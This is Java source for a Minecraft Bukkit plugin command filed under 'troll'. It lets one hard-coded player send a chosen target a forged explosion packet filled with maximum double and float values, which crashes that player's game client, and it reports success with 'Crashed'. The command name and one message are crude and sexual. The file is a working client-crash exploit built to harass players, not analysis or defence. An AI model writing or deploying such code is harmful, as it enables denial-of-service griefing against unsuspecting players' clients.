package withicality.csmp.global.commands.troll;

import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import withicality.csmp.api.APIStuff;
import withicality.csmp.api.CosmicCommand;

import java.lang.reflect.InvocationTargetException;
import java.util.Arrays;
import java.util.List;

public class FunnyCommand extends CosmicCommand {
    public FunnyCommand() {
        super("proxsuckmyp", "idk", "forgot lol", "csmp.funnycommand");
        setMinArguments(1);
    }

    public void onCommand() {
        checkConsole();
        Player player = (Player) sender;

        List<String> poo = Arrays.asList("129d76da-0e85-4f49-9bad-09604aa4004a");
        checkBoolean(!poo.contains(player.getUniqueId().toString()), "I'm gonna suck you");

        Player p = APIStuff.getPlayer(args[0], player);
        checkNotNull(p, noPlayerFound(args[0]));

        ProtocolManager manager = APIStuff.getProtocolManager();
        PacketContainer packet = manager.createPacket(com.comphenix.protocol.PacketType.Play.Server.EXPLOSION);
        packet.getDoubles().write(0, Double.MAX_VALUE);
        packet.getDoubles().write(1, Double.MAX_VALUE);
        packet.getDoubles().write(2, Double.MAX_VALUE);
        packet.getFloat().write(0, Float.MAX_VALUE);
        packet.getFloat().write(1, Float.MAX_VALUE);
        packet.getFloat().write(2, Float.MAX_VALUE);
        packet.getFloat().write(3, Float.MAX_VALUE);

        try {
            manager.sendServerPacket(p, packet);
            sender.sendMessage(ChatColor.GREEN + "Crashed p " + p.getName() + ".");
        } catch (InvocationTargetException e) {
            e.printStackTrace();
            sender.sendMessage(ChatColor.RED + "Unnable to crash " + p.getName() + ".");
        }
    }
}
